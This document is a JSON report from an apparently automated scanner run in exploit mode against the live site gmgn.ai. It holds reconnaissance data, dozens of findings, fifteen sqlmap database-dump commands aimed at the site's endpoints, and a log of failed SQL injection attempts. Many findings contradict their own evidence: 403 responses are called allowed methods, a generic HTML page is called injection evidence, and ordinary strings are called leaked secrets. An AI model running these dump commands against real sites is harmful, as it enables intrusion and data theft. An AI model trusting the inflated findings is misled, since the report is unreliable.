@@ -1,0 +1,594 @@
+{
+  "scan_id": "aebf2b0fbb91",
+  "timestamp": "2026-07-05T20:46:56.063091",
+  "target": "https://gmgn.ai",
+  "config": {
+    "full_scan": true,
+    "exploit": true,
+    "threads": 10,
+    "timeout": 30
+  },
+  "recon": {
+    "target": "https://gmgn.ai",
+    "timestamp": "2026-07-05T20:46:56.063143",
+    "subdomains": [
+      "www.gmgn.ai"
+    ],
+    "open_ports": [
+      {
+        "port": 80,
+        "service": "HTTP",
+        "state": "open"
+      },
+      {
+        "port": 443,
+        "service": "HTTPS",
+        "state": "open"
+      },
+      {
+        "port": 8080,
+        "service": "HTTP-Alt",
+        "state": "open"
+      },
+      {
+        "port": 8443,
+        "service": "HTTPS-Alt",
+        "state": "open"
+      }
+    ],
+    "technologies": {
+      "server": [
+        "cloudflare"
+      ],
+      "framework": [
+        "Next.js"
+      ],
+      "cms": [],
+      "cdn": [
+        "Cloudflare"
+      ],
+      "javascript": [
+        "Moment.js"
+      ],
+      "analytics": [
+        "Google Analytics",
+        "Google Tag Manager"
+      ]
+    },
+    "dns_records": {
+      "A": [
+        "104.18.0.179",
+        "104.18.1.179"
+      ],
+      "MX": [],
+      "TXT": []
+    },
+    "ssl_info": {
+      "valid": true,
+      "issuer": {
+        "countryName": "US",
+        "organizationName": "Google Trust Services",
+        "commonName": "WE1"
+      },
+      "expiry": "Aug 23 05:00:41 2026 GMT",
+      "subject": {
+        "commonName": "gmgn.ai"
+      }
+    }
+  },
+  "vulnerabilities": [
+    {
+      "type": "MISSING_SECURITY_HEADER",
+      "severity": "LOW",
+      "location": "HTTP Headers",
+      "payload": null,
+      "evidence": null,
+      "description": "Missing security header: Permissions Policy",
+      "remediation": "Add Permissions-Policy header to responses",
+      "cve": null,
+      "exploitable": false,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:18.451061"
+    },
+    {
+      "type": "DANGEROUS_HTTP_METHOD",
+      "severity": "HIGH",
+      "location": "HTTP Methods",
+      "payload": null,
+      "evidence": "PUT returned 403",
+      "description": "Dangerous HTTP method allowed: PUT",
+      "remediation": "Disable PUT method if not required",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:19.430548"
+    },
+    {
+      "type": "DANGEROUS_HTTP_METHOD",
+      "severity": "HIGH",
+      "location": "HTTP Methods",
+      "payload": null,
+      "evidence": "DELETE returned 403",
+      "description": "Dangerous HTTP method allowed: DELETE",
+      "remediation": "Disable DELETE method if not required",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:19.550093"
+    },
+    {
+      "type": "DANGEROUS_HTTP_METHOD",
+      "severity": "MEDIUM",
+      "location": "HTTP Methods",
+      "payload": null,
+      "evidence": "CONNECT returned 400",
+      "description": "Dangerous HTTP method allowed: CONNECT",
+      "remediation": "Disable CONNECT method if not required",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:19.786764"
+    },
+    {
+      "type": "DANGEROUS_HTTP_METHOD",
+      "severity": "MEDIUM",
+      "location": "HTTP Methods",
+      "payload": null,
+      "evidence": "OPTIONS returned 403",
+      "description": "Dangerous HTTP method allowed: OPTIONS",
+      "remediation": "Disable OPTIONS method if not required",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:19.906059"
+    },
+    {
+      "type": "RSA_NO_RATE_LIMITING",
+      "severity": "MEDIUM",
+      "location": "/api/login",
+      "payload": null,
+      "evidence": null,
+      "description": "No rate limiting on authentication endpoint",
+      "remediation": "Implement rate limiting on auth endpoints",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:34.362840"
+    },
+    {
+      "type": "RSA_NO_RATE_LIMITING",
+      "severity": "MEDIUM",
+      "location": "/login",
+      "payload": null,
+      "evidence": null,
+      "description": "No rate limiting on authentication endpoint",
+      "remediation": "Implement rate limiting on auth endpoints",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:37.337339"
+    },
+    {
+      "type": "RSA_NO_RATE_LIMITING",
+      "severity": "MEDIUM",
+      "location": "/api/auth",
+      "payload": null,
+      "evidence": null,
+      "description": "No rate limiting on authentication endpoint",
+      "remediation": "Implement rate limiting on auth endpoints",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:38.766108"
+    },
+    {
+      "type": "RSA_NO_RATE_LIMITING",
+      "severity": "MEDIUM",
+      "location": "/auth/login",
+      "payload": null,
+      "evidence": null,
+      "description": "No rate limiting on authentication endpoint",
+      "remediation": "Implement rate limiting on auth endpoints",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:47:41.944659"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/user?id=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/api/user?id=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.901149"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/user?user=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: user",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/api/user?user=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.906737"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/user?username=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/api/user?username=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.912116"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/auth?id=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/api/auth?id=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.918233"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/auth?user=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: user",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/api/auth?user=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.923951"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/auth?username=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/api/auth?username=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.929413"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/user?id=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/user?id=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.936460"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/user?user=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: user",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/user?user=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.942098"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/user?username=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/user?username=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.947427"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/login?id=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/login?id=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.953512"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/login?user=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: user",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/login?user=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.958409"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/login?username=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/login?username=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.963921"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/search?id=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/search?id=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.970206"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/search?user=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: user",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/search?user=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.976150"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/search?username=",
+      "payload": "' OR '1'='1",
+      "evidence": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://gmgn.ai/search?username=%27%20OR%20%271%27%3D%271' --batch --dump",
+      "timestamp": "2026-07-05T20:48:01.981383"
+    },
+    {
+      "type": "MEMORY_SCAN_SENSITIVE_DATA",
+      "severity": "CRITICAL",
+      "location": "/api/debug",
+      "payload": null,
+      "evidence": "Found 46 matches: PHN2ZyB4bWxucz0iaHR0...",
+      "description": "Sensitive pattern exposed: API_KEY_32_CHAR",
+      "remediation": "Remove secrets from responses, use environment variables",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:48:23.177742"
+    },
+    {
+      "type": "MEMORY_SCAN_SENSITIVE_DATA",
+      "severity": "CRITICAL",
+      "location": "/api/version",
+      "payload": null,
+      "evidence": "Found 49 matches: PHN2ZyB4bWxucz0iaHR0...",
+      "description": "Sensitive pattern exposed: API_KEY_32_CHAR",
+      "remediation": "Remove secrets from responses, use environment variables",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:48:23.876433"
+    },
+    {
+      "type": "DISASSEMBLY_SECRET_IN_JS",
+      "severity": "HIGH",
+      "location": "/_next/static/chunks/gmgn-vendors-62a25ab54e6fea0e.js",
+      "payload": null,
+      "evidence": "Found Password: forget_password...",
+      "description": "Secret exposed in JavaScript: Password",
+      "remediation": "Never hardcode secrets in client-side code",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:48:38.027436"
+    },
+    {
+      "type": "DISASSEMBLY_SECRET_IN_JS",
+      "severity": "HIGH",
+      "location": "/_next/static/chunks/sentry-bundle-32aabbcbdc49b16f.js",
+      "payload": null,
+      "evidence": "Found Password: %filtered%...",
+      "description": "Secret exposed in JavaScript: Password",
+      "remediation": "Never hardcode secrets in client-side code",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:48:38.412262"
+    },
+    {
+      "type": "DISASSEMBLY_SECRET_IN_JS",
+      "severity": "HIGH",
+      "location": "/_next/static/chunks/main-2822e06d64399374.js",
+      "payload": null,
+      "evidence": "Found Token: is_refreshing_access_token...",
+      "description": "Secret exposed in JavaScript: Token",
+      "remediation": "Never hardcode secrets in client-side code",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:48:38.803546"
+    },
+    {
+      "type": "DISASSEMBLY_SECRET_IN_JS",
+      "severity": "HIGH",
+      "location": "/_next/static/chunks/pages/_app-a2f262805ca5a243.js",
+      "payload": null,
+      "evidence": "Found Token: __tv_preload_placeholder__...",
+      "description": "Secret exposed in JavaScript: Token",
+      "remediation": "Never hardcode secrets in client-side code",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:48:39.912196"
+    }
+  ],
+  "exploits": [
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:42.676304"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:43.100974"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:43.521662"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:43.939936"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:44.360354"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:44.779585"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:45.198729"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:45.618661"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:46.039018"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:46.458304"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:46.877913"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:47.299800"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:47.721830"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:48.142803"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:48:48.561953"
+    }
+  ],
+  "reports": {}
+}
